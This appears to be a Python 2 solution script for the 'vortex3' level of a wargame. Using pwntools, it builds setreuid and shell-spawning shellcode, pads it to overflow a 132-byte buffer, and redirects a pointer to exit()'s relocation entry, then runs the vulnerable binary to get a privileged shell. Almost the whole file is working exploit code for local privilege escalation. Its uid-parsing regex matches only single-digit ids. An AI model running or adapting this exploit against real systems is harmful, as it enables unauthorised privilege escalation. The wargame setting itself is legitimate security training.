#!/usr/bin/env python2

import os
import re
import struct
import subprocess
import pwn


pwn.context(arch="i386", os="linux")


# get user vortex4's uid
with open("/etc/passwd", "r") as fd:
    r_buf = fd.read()
    match = re.search('(?P<vortex4_passwd_entry>vortex4:x:\d:\d)', r_buf)
    if match:
        vortex4_uid = int(
            match.group('vortex4_passwd_entry').split(':')[-1])
        print 'found user vortex4 with uid: [{0}]'.format(vortex4_uid)

print 'generating shellcode... ',

shellcode = pwn.asm(pwn.shellcraft.setreuid() + pwn.shellcraft.sh())

'''
[ 0x80482a4 ] is the r_offset field of the exit() function's entry
in the dynamic relocation table
'''
# address of dynamic relocation table entry for libc's exit()
exit_reltab_addr = struct.pack('<I', 0x80482a4)

# 132 = sizeof(vuln_buf) + sizeof(tmp_ptr)
exp_egg = shellcode + \
    '\x41' * (132 - len(shellcode)) + exit_reltab_addr

print '[done]'


print 'trying to exploit the vulnerable binary'

exit_stat = subprocess.call(["./vortex3", exp_egg])

if exit_stat != os.EX_OK:
    print 'failed to exploit the vulnerable binary'
